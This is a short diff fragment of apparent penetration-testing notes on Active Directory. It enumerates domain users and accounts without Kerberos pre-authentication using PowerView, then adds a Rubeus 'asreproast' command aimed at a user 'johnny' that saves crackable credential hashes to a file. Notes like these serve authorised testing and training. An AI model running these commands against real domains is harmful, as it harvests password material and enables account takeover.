@@ -19,4 +19,5 @@ Get-DomainUser | Select-Object -ExpandProperty cn | Out-File users.txt
 Get-DomainUser | Where-Object { $_.useraccountcontrol -like "*DONT_REQ_PREAUTH"}
 ```
 ```
+.\Rubeus.exe asreproast /usr:johnny /outfile:file.txt
 ```
